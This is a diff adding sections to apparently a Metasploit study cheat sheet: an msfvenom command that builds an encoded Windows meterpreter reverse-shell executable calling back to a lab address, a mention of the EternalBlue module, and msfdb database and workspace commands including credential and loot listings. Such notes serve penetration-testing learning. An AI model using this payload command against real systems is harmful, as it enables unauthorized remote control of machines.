@@ -89,3 +89,48 @@ windows/x64/powershell/$
 # VNC access via injection
 windows/x64/vncinject/$
 ```
+### Encoders
+```bash
+msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o shell.exe
+
+msf6 exploit(windows/smb/ms17_010_eternalblue) > show encoders # for the exploit
+```
+
+###  Databases
+```bash
+# setup db
+sudo service postgresql start
+sudo msfdb init    
+sudo msfdb status # check the db status
+sudo msfdb run 
+
+# have problem in msfdb init ? , port 5432 failed: Connection refused 
+sudo nano /etc/postgresql/17/main/postgresql.conf  # check the port to 5432
+sudo msfdb run
+msf6 > connect 127.0.0.1 5432
+
+# if we alredy setup the db
+sudo msfdb reinit
+sudo cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
+sudo service postgresql restart
+sudo msfdb run
+
+msf6 > db_status   # connected 
+msf6 > help database
+
+
+workspace -h
+workspace -a Target_1 # add new workspace
+workspace Target_1 
+workspace             # * Target_1
+
+
+hosts # host addresses, hostnames, and other information(Nessus, NexPose, or Nmap)
+services  # information on services discovered during scans or interactions.
+creds  # credentials gathered during your interactions
+loot # works in conjunction with the command above to offer you an at-a-glance list of owned services and users
+
+db_nmap -sV -sS 10.10.10.8 # nmap scan inside msfconsole
+b_import nmap_scan.xml # import nmap scan
+db_export -f xml backup.xml # export db
+```
